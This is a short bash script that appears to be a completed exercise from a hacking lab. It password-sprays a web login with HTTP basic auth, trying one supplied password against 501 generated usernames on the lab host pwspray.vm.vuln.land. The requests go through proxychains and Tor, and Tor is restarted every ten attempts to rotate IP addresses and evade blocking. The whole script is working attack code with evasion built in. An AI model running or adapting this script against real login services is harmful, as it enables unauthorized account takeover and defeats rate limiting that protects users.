#!/usr/bin/bash

password=$1 # the password is supplied as command line parameter
user_prefix="user_140" # all usernames start with this prefix

for user in {0..500}; do # iterate through all 501 possible usernames
    if !(($user % 10)); then # at the beginning and after 10 users, restart tor
        echo "Restarting Tor service and sleeping for 5 seconds"

        # ADD CODE HERE to restart tor, then sleep for 5 seconds
		sudo systemctl restart tor
        sleep 5
    fi
    user_expanded=$(printf "%03d" $user) # add leading 0s to user (e.g., 25 => 025)
    candidate="$user_prefix$user_expanded:$password" # create the next username-password candidate
    echo "Testing $candidate" # test candidate and check if it was successful (200 OK)

    # ADD CODE HERE to try to login with candidate and check whether login was successful.
    # If successful, echo the candidate and exit.
	if proxychains -q curl -s --include http://pwspray.vm.vuln.land -u "$candidate" | head -n1 | grep 200; then
        echo "$candidate"
        exit 0
	fi
done

exit 1